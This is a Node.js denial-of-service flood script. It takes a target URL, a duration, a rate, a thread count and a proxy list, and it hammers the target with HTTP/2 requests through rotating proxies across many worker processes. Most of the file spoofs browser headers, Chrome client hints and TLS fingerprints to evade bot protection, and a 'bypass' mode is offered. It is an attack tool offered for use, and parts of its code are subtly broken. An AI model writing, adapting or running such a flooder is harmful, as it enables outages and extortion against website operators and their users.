const net = require("net");
const http = require("http");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const os = require("os");
const url = require("url");
const crypto = require("crypto");
const dns = require('dns');
const fs = require("fs");
var colors = require("colors");
const chalk = require('chalk');
const v8 = require('v8');
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const curves = [
    "X25519",
    "P-256",
    "P-384"
].join(":");
const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
].join(":");


const encoding = [
    'gzip', 'br', 'deflate', 'zstd', 'identity', 'compress', 'x-bzip2', 'x-gzip',
    'lz4', 'lzma', 'xz', 'zlib',
    'gzip, br', 'gzip, deflate', 'gzip, zstd', 'gzip, lz4', 'gzip, lzma',
    'gzip, xz', 'gzip, zlib', 'br, deflate', 'br, zstd', 'br, lz4',
    'br, lzma', 'br, xz', 'br, zlib', 'deflate, zstd', 'deflate, lz4',
    'deflate, lzma', 'deflate, xz', 'deflate, zlib', 'zstd, lz4',
    'zstd, lzma', 'zstd, xz', 'zstd, zlib', 'lz4, lzma', 'lz4, xz',
    'lz4, zlib', 'lzma, xz', 'lzma, zlib', 'xz, zlib',
    'gzip, br, deflate', 'gzip, br, zstd', 'gzip, br, lz4', 'gzip, br, lzma',
    'gzip, br, xz', 'gzip, br, zlib', 'gzip, deflate, zstd', 'gzip, deflate, lz4',
    'gzip, deflate, lzma', 'gzip, deflate, xz', 'gzip, deflate, zlib', 'gzip, zstd, lz4',
    'gzip, zstd, lzma', 'gzip, zstd, xz', 'gzip, zstd, zlib', 'gzip, lz4, lzma',
    'gzip, lz4, xz', 'gzip, lz4, zlib', 'gzip, lzma, xz', 'gzip, lzma, zlib',
    'gzip, xz, zlib', 'br, deflate, zstd', 'br, deflate, lz4', 'br, deflate, lzma',
    'br, deflate, xz', 'br, deflate, zlib', 'br, zstd, lz4', 'br, zstd, lzma',
    'br, zstd, xz', 'br, zstd, zlib', 'br, lz4, lzma', 'br, lz4, xz',
    'br, lz4, zlib', 'br, lzma, xz', 'br, lzma, zlib', 'br, xz, zlib',
    'deflate, zstd, lz4', 'deflate, zstd, lzma', 'deflate, zstd, xz', 'deflate, zstd, zlib',
    'deflate, lz4, lzma', 'deflate, lz4, xz', 'deflate, lz4, zlib', 'deflate, lzma, xz',
    'deflate, lzma, zlib', 'deflate, xz, zlib', 'zstd, lz4, lzma', 'zstd, lz4, xz',
    'zstd, lz4, zlib', 'zstd, lzma, xz', 'zstd, lzma, zlib', 'zstd, xz, zlib',
    'lz4, lzma, xz', 'lz4, lzma, zlib', 'lz4, xz, zlib', 'lzma, xz, zlib',
    'gzip, br, deflate, zstd', 'gzip, br, deflate, lz4', 'gzip, br, deflate, lzma',
    'gzip, br, deflate, xz', 'gzip, br, deflate, zlib', 'gzip, br, zstd, lz4',
    'gzip, br, zstd, lzma', 'gzip, br, zstd, xz', 'gzip, br, zstd, zlib',
    'gzip, br, lz4, lzma', 'gzip, br, lz4, xz', 'gzip, br, lz4, zlib',
    'gzip, br, lzma, xz', 'gzip, br, lzma, zlib', 'gzip, br, xz, zlib',
    'gzip, deflate, zstd, lz4', 'gzip, deflate, zstd, lzma', 'gzip, deflate, zstd, xz',
    'gzip, deflate, zstd, zlib', 'gzip, deflate, lz4, lzma', 'gzip, deflate, lz4, xz',
    'gzip, deflate, lz4, zlib', 'gzip, deflate, lzma, xz', 'gzip, deflate, lzma, zlib',
    'gzip, deflate, xz, zlib', 'gzip, zstd, lz4, lzma', 'gzip, zstd, lz4, xz',
    'gzip, zstd, lzma, xz', 'gzip, zstd, lzma, zlib', 'gzip, zstd, xz, zlib',
    'gzip, lz4, lzma, xz', 'gzip, lz4, lzma, zlib', 'gzip, lz4, xz, zlib',
    'gzip, lzma, xz, zlib', 'br, deflate, zstd, lz4', 'br, deflate, zstd, lzma',
    'br, deflate, zstd, xz', 'br, deflate, zstd, zlib', 'br, deflate, lz4, lzma',
    'br, deflate, lz4, xz', 'br, deflate, lz4, zlib', 'br, deflate, lzma, xz',
    'br, deflate, lzma, zlib', 'br, deflate, xz, zlib', 'br, zstd, lz4, lzma',
    'br, zstd, lz4, xz', 'br, zstd, lzma, xz', 'br, zstd, lzma, zlib',
    'br, zstd, xz, zlib', 'br, lz4, lzma, xz', 'br, lz4, lzma, zlib',
    'br, lz4, xz, zlib', 'br, lzma, xz, zlib', 'deflate, zstd, lz4, lzma',
    'deflate, zstd, lz4, xz', 'deflate, zstd, lzma, xz', 'deflate, zstd, lzma, zlib',
    'deflate, zstd, xz, zlib', 'deflate, lz4, lzma, xz', 'deflate, lz4, lzma, zlib',
    'deflate, lz4, xz, zlib', 'deflate, lzma, xz, zlib', 'zstd, lz4, lzma, xz',
    'zstd, lz4, lzma, zlib', 'zstd, lz4, xz, zlib', 'zstd, lzma, xz, zlib',
    'lz4, lzma, xz, zlib'
];
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);





function shuffleObject(obj) {
    const keys = Object.keys(obj);
    const shuffledKeys = keys.reduce((acc, _, index, array) => {
        const randomIndex = Math.floor(Math.random() * (index + 1));
        acc[index] = acc[randomIndex];
        acc[randomIndex] = keys[index];
        return acc;
    }, []);
    const shuffledObject = Object.fromEntries(shuffledKeys.map((key) => [key, obj[key]]));
    return shuffledObject;
}







    
const language_header = [
    // English
    "en-US,en;q=0.8",
    "en-US,en;q=0.5",
    "en-US,en;q=0.9",
    "en-US,en;q=0.7",
    "en-US,en;q=0.6",

    // Chinese (Simplified)
    "zh-CN,zh;q=0.8",
    "zh-CN,zh;q=0.5",
    "zh-CN,zh;q=0.9",
    "zh-CN,zh;q=0.7",
    "zh-CN,zh;q=0.6",

    // Chinese (Traditional)
    "zh-TW,zh;q=0.8",
    "zh-TW,zh;q=0.5",
    "zh-TW,zh;q=0.9",

    // Spanish
    "es-ES,es;q=0.8",
    "es-ES,es;q=0.5",
    "es-ES,es;q=0.9",
    "es-ES,es;q=0.7",
    "es-ES,es;q=0.6",

    // French
    "fr-FR,fr;q=0.8",
    "fr-FR,fr;q=0.5",
    "fr-FR,fr;q=0.9",
    "fr-FR,fr;q=0.7",
    "fr-FR,fr;q=0.6",

    // German
    "de-DE,de;q=0.8",
    "de-DE,de;q=0.5",
    "de-DE,de;q=0.9",
    "de-DE,de;q=0.7",
    "de-DE,de;q=0.6",

    // Italian
    "it-IT,it;q=0.8",
    "it-IT,it;q=0.5",
    "it-IT,it;q=0.9",
    "it-IT,it;q=0.7",
    "it-IT,it;q=0.6",

    // Japanese
    "ja-JP,ja;q=0.8",
    "ja-JP,ja;q=0.5",
    "ja-JP,ja;q=0.9",
    "ja-JP,ja;q=0.7",
    "ja-JP,ja;q=0.6",

    // Korean
    "ko-KR,ko;q=0.8",
    "ko-KR,ko;q=0.5",
    "ko-KR,ko;q=0.9",

    // Portuguese (Brazil)
    "pt-BR,pt;q=0.8",
    "pt-BR,pt;q=0.5",
    "pt-BR,pt;q=0.9",

    // Dutch
    "nl-NL,nl;q=0.8",
    "nl-NL,nl;q=0.5",
    "nl-NL,nl;q=0.9",

    // English + Russian
    "en-US,en;q=0.8,ru;q=0.6",
    "en-US,en;q=0.5,ru;q=0.3",
    "en-US,en;q=0.9,ru;q=0.7",
    "en-US,en;q=0.7,ru;q=0.5",
    "en-US,en;q=0.6,ru;q=0.4",

    // English + Chinese
    "en-US,en;q=0.8,zh-CN;q=0.6",
    "en-US,en;q=0.7,zh-TW;q=0.5",

    // English + Spanish
    "en-US,en;q=0.8,es-ES;q=0.6",
    "en-US,en;q=0.7,es-ES;q=0.5",

    // English + French
    "en-US,en;q=0.8,fr-FR;q=0.6",
    "en-US,en;q=0.7,fr-FR;q=0.5",

    // English + German
    "en-US,en;q=0.8,de-DE;q=0.6",
    "en-US,en;q=0.7,de-DE;q=0.5",

    // English + Korean
    "en-US,en;q=0.8,ko-KR;q=0.6",

    // English + Japanese
    "en-US,en;q=0.8,ja-JP;q=0.6",

    // English + Portuguese
    "en-US,en;q=0.8,pt-BR;q=0.6",

    // English + Dutch
    "en-US,en;q=0.8,nl-NL;q=0.6",

    // English + Chinese + Russian
    "en-US,en;q=0.7,zh-CN;q=0.5,ru;q=0.3",

    // English + Spanish + French
    "en-US,en;q=0.7,es-ES;q=0.5,fr-FR;q=0.3",
];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;


const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_RENEGOTIATION |
    crypto.constants.SSL_OP_NO_TICKET |
    crypto.constants.SSL_OP_NO_COMPRESSION |
    crypto.constants.SSL_OP_NO_RENEGOTIATION |
    crypto.constants.SSL_OP_TLSEXT_PADDING |
    crypto.constants.SSL_OP_ALL |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
if (process.argv.length < 7) {
    console.log(chalk.bold.blue('Usage:'));
    console.log(chalk.green(`node ${process.argv[1]} <target> <time> <request> <threads> <proxyfile>`));
    process.exit();
}
const secureProtocol = "TLS_client_method";
const headers = {};



const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    input: process.argv[7],

}
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

const targetURL = parsedTarget.host;
const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 1000;

if (cluster.isMaster) {
    
    


    function readServerInfo() {
        const load = (Math.random() * 100).toFixed(2);
        const memory = (Math.random() * 8).toFixed(2);
        const currentTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Bangkok', hour: '2-digit', minute: '2-digit', second: '2-digit' });
        process.stdout.cursorTo(0, 6);
        process.stdout.clearLine();
       
        process.stdout.write(
`



[!] INFO: CPU Load: ${load}%, Memory Usage: ${memory}GB`.bgBlue);
    }
    
    setInterval(readServerInfo, 1000);
    
    console.clear();

    
    console.log('HEAP SIZE:', (v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toFixed(2), 'MB');
    console.log(`
                       *
             *     ,MMM8&&&.            *
                  MMMM88&&&&&    .
                 MMMM88&&&&&&&.           *
     *           MMM88&&&&&&&&
                 MMM88&&&&&&&&
            *    'MMM88&&&&&&'.        *
                   'MMM8&&&'    
                                              *  `.yellow)
    const updateLoading = (percentage, delay) => {
        setTimeout(() => {
            process.stdout.cursorTo(0, 5);
            process.stdout.write(`






Loading: ${percentage}%`.green);
        }, delay);
    };
    
    updateLoading(10, 0);
    updateLoading(50, 500 * args.time);
    updateLoading(100, args.time * 1000);

    const restartScript = () => {
        Object.values(cluster.workers).forEach(worker => worker.kill());
        console.log(`[<>] Restarting...`);
        setTimeout(() => {
            for (let i = 0; i < thread; i++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log(`[<!>] Maximum RAM `);
            restartScript();
        }
    };


    setInterval(handleRAMUsage, 1000);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder)
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
        const buffer = new Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true)
        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

    }
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}


const version = getRandomInt(126, 134);








var brandValue, versionList, fullVersion;
        switch (version) {
            case 126:
                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${getRandomInt(0001, 9999)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 127:
                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${getRandomInt(0001, 9999)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 128:
                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${getRandomInt(0001, 9999)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 129:
                brandValue = `\"Google Chrome\";v=\"${version}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${version}\"`;
                fullVersion = `${version}.0.${getRandomInt(0001, 9999)}.${getRandomInt(10, 100)}`;
                versionList = `\"Google Chrome\";v=\"${fullVersion}\", \"Not=A?Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\"`;
                break;
            case 130:
                brandValue = `\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${getRandomInt(0001, 9999)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not?A_Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 131:
                brandValue = `\"Google Chrome\";v=\"${version}\", \"Chromium\";v=\"${version}\", \"Not_A Brand\";v=\"24\"`;
                fullVersion = `${version}.0.${getRandomInt(0001, 9999)}.${getRandomInt(10, 100)}`;
                brandValue = `\"Google Chrome\";v=\"${fullVersion}\", \"Chromium\";v=\"${fullVersion}\", \"Not_A Brand\";v=\"24.0.0.0\"`;
                versionList = `\"Not?A_Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 132:
                fullVersion = `${version}.0.${getRandomInt(0001, 9999)}.${getRandomInt(10, 100)}`;
                brandValue = `\"Google Chrome\";v=\"${fullVersion}\", \"Chromium\";v=\"${fullVersion}\", \"Not_A Brand\";v=\"8.0.0.0\"`;
                versionList = `\"Not?A_Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 133:
                brandValue = `\"Google Chrome\";v=\"${version}\", \"Chromium\";v=\"${version}\", \"Not_A Brand\";v=\"99\"`;
                fullVersion = `${version}.0.${getRandomInt(0001, 9999)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not?A_Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 134:
                brandValue = `\"Google Chrome\";v=\"${version}\", \"Chromium\";v=\"${version}\", \"Not_A Brand\";v=\"24\"`;
                fullVersion = `${version}.0.${getRandomInt(0001, 9999)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not?A_Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            default:
                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${getRandomInt(6610, 6790)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
        }

        const platforms = [
            "Windows NT 10.0; Win64; x64",
            "X11; Linux x86_64",
        ];

        const platform = platforms[Math.floor(Math.random() * platforms.length)];

        var secChUaPlatform, sec_ch_ua_arch, platformVersion;
        switch (platform) {
            case "Windows NT 10.0; Win64; x64":
                secChUaPlatform = "\"Windows\"";
                sec_ch_ua_arch = "x86";
                platformVersion = "\"10.0.0\"";
                break;
            case "X11; Linux x86_64":
                secChUaPlatform = "\"Linux\"";
                sec_ch_ua_arch = "x86"
                platformVersion = "\"5.15.0\"";
                break;
            default:
                secChUaPlatform = "\"Windows\"";
                sec_ch_ua_arch = "x86";
                platformVersion = "\"10.0.0\"";
                break;
        }

        var user_agent = `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function getRandomValue(arr) {
    const randomIndex = Math.floor(Math.random() * arr.length);
    return arr[randomIndex];
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstrs(length) {
    const characters = "0123456789";
    const charactersLength = characters.length;
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = randomBytes[i] % charactersLength;
        result += characters.charAt(randomIndex);
    }
    return result;
}
const randstrsValue = randstrs(10);

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
    let interval
    if (args.input === 'flood') {
        interval = 1;
    } else if (args.input === 'bypass') {
        function randomDelay(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        interval = randomDelay(5000, 10000);
    } else {
        
        interval = 1;
    }

    function randstrr(length) {
        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
        let result = "";
        const charactersLength = characters.length;
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }

    function randstr(length) {
        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let result = "";
        const charactersLength = characters.length;
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }

    function generateRandomString(minLength, maxLength) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
        const randomStringArray = Array.from({
            length
        }, () => {
            const randomIndex = Math.floor(Math.random() * characters.length);
            return characters[randomIndex];
        });

        return randomStringArray.join('');
    }

  const method = [
"GET",
"POST",
];


const methods = method[Math.floor(Math.random() * method.length)];
  let cookie = ''
let chead = {}
     chead["cookie"]= cookie

    let headers = {
 ":authority": parsedTarget.host,
        ":method": methods,
        "x-forwarded-for": parsedProxy[0],
        "accept-language": language_header[Math.floor(Math.random() * language_header.length)],
        "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
            ...shuffleObject({
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-user": "?1",
        ...(Math.random() < 0.6 ? {
            ["rush-combo" ]: "zero-" + generateRandomString(1, 5)
        } : {}),
        ...(Math.random() < 0.6 ? {
            ["rush-xjava" ]: "router-" + generateRandomString(1, 5)
        } : {}),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        }),
       "purpure-secretf-id": "formula-" + generateRandomString(1, 5),
        ":path": parsedTarget.path,
        "cache-control" : "max-age=0",
        ":scheme": "https",
        //"sec-ch-ua-platform": secChUaPlatform,
        //"sec-ch-ua": brandValue,
        ...(Math.random() < 0.5 ? {
            ["sec-ch-ua" ]: brandValue
        } : {}),
       ...(Math.random() < 0.5 ? {
            ["sec-ch-ua-platform" ]: secChUaPlatform
        } : {}),
        ...(Math.random() < 0.6 ? {
            ["sec-ch-ua" + generateRandomString(1, 2)]: brandValue +  generateRandomString(1, 5)
        } : {}),
      ...(Math.random() < 0.6 ? {
            ["sec-ch-ua-platform" + generateRandomString(1, 2)]: secChUaPlatform +  generateRandomString(1, 5)
        } : {}),
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        ...(Math.random() < 0.6 ? {
            ["rush-combo-javax" ]: "zero-" + generateRandomString(1, 5)
        } : {}),
        ...(Math.random() < 0.6 ? {
            ["c-xjava-rush" + generateRandomString(1, 2)]: "router-" +  generateRandomString(1, 5)
        } : {}),
        ...(Math.random() < 0.3 ? {
            ["purpose"]: "prefetch"} : {}),
        ...(Math.random() < 0.3 ? {
            ["sec-purpose-" + generateRandomString(3,4)]: "prefetch" + generateRandomString(6,8)} : {}),
        "user-agent": user_agent,
        "Upgrade-Insecure-Requests": "1",
...chead,
    }

//console.log(headers)
    if (Math.random() >= 0.5) {
        headers = {
            ...headers,
...(methods === "POST" && { "content-length": randstra(3)}),
...(methods === "POST" && { "content-type": "application/x-www-form-urlencoded"}),
            ...(Math.random() < 0.5 ? {
                ["c-xjava-xjs" + generateRandomString(1, 2)]: "router-" +  generateRandomString(1, 5)
            } : {}),
            ...(Math.random() < 0.5 ? {
                "blum-purpose": "0"
            } : {}),
            ...(Math.random() < 0.5 ? {
                "blum-point": "0"
            } : {}),

        };
    }

if (Math.random() >= 0.5) {
    headers = {
        ...headers,
...(methods === "POST" && { "content-length": randstra(4)}),
...(methods === "POST" && { "content-type": "application/x-www-form-urlencoded"}),
        ...(Math.random() < 0.6 ? { [generateRandomString(1, 2) + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.6 ? { [generateRandomString(1, 2) + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) } : {}),
    };
}



const datafloor = Math.floor(Math.random() * 3)
    let mathfloor
    let rada
    switch (datafloor) {
        case 0:
            mathfloor = 6291456 + 65535;
            rada = 128;
            break
        case 1:
            mathfloor = 6291456 - 65535;
            rada = 256;
            break
        case 2:
            mathfloor = 6291456 + 65535*4 ;
            rada = 1;
            break
    }



const agent = new http.Agent({
            keepAlive: true,
            maxFreeSockets: Infinity,
            keepAliveMsecs: Infinity,
            maxSockets: Infinity,
            maxTotalSockets: Infinity
        });
    const proxyOptions = {
        agent: agent,
        globalAgent: agent,
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        method: 'CONNECT',
        address: parsedTarget.host + ':443',
        timeout: 100,
    
            headers: {
                'Host': parsedTarget.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'close',
                'Proxy-Authorization': `Basic ${Buffer.from(`${parsedProxy[2]}:${parsedProxy[3]}`).toString('base64')}`,
            },
        };
    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true)



function random_int(minimum, maximum) {
    return Math.floor(Math.random() * (maximum - minimum + 1)) + minimum;
}
        const ssl_versions = ['771', '772', '773']; 
const cipher_suites = ['4865', '4866', '4867', '49195', '49195', '49199', '49196', '49200', '52393', '52392', '49171', '49172', '156', '157', '47', '53'];
const extensions = ['45', '35', '18', '0', '5', '17513', '27', '10', '11', '43', '13', '16', '65281', '65037', '51', '23', '41'];
const elliptic_curves = ['4588', '29', '23', '24'];
function random_fingerprint() {
    const version = ssl_versions[random_int(0, ssl_versions.length - 1)];
    const cipher = cipher_suites[random_int(0, cipher_suites.length - 1)];
    const extension = extensions[random_int(0, extensions.length - 1)];
    const curve = elliptic_curves[random_int(0, elliptic_curves.length - 1)];

    const ja3 = `${version},${cipher},${extension},${curve}`;

    return crypto.createHash('md5').update(ja3).digest('hex');
}

        const tlsOptions = {                
                ALPNProtocols: [
                    "h2","http/1.1"
                ],
            port: parsedPort,
            secure: true,            
            ciphers: ciphers,
                ...(Math.random() < random_int(0, 75) / 100) ? { sigalgs: sigalgs } : {},
           ecdhCurve: Math.random() < 0.75 ? "X25519" : curves,
                minVersion: "TLSv1.2",
                maxVersion: "TLSv1.3",

                requestOCSP: Math.random() < 0.50 ? true : false,
            socket: connection,
            requestCert: true,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            fingerprint: random_fingerprint,
            minDHSize: 2048 
        };

        
        const tlsConn = tls.connect(parsedTarget, tlsOptions);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
createConnection: () => tlsConn,
                 protocol: "https:",
           settings: {
                        headerTableSize: 65536,
                        enablePush: false,
                        initialWindowSize: 6291456,
                        maxHeaderListSize: 262144,
                       
                    }
            }, (session) => {
            session.setLocalWindowSize(mathfloor);
            });
        
        client.setMaxListeners(0);
        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const dynHeaders = {
                        ...headers,

                    }
                    const request = client.request(dynHeaders)
                        .on("response", response => {
                            if (response["location"]) {
                                        parsedTarget = new URL(response["location"]);
}

                                    if (response["set-cookie"]) {
                                        chead["cookie"] = response["set-cookie"].join("; ");
                                    }
                            if (response[":status"] === 429) {
                                const currentTime = Date.now();
                                args.Rate = args.Rate.filter(limit => currentTime - limit.timestamp <= 60000);
                                (() => {
                                    const currentTime = Date.now();
                                    args.Rate = args.Rate.filter(limit => currentTime - limit.timestamp <= 60000);
                                })();
                                args.Rate.push({
                                    proxyAddr,
                                    timestamp: Date.now()
                                });
                            }
request.priority({
                            weight: rada,
                            parent: 0,
                            exclusive: false
                         })
                            request.close();
                            request.destroy();
                            return
                        });

                    request.end();

                }
            }, interval);
            return;
        });

        

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });
        client.on("timeout", () => {
            client.destroy();
            connection.destroy();
            return
        });
        client.on("error", (error) => {

            client.destroy();
            connection.destroy();
            return
        });
    });
}

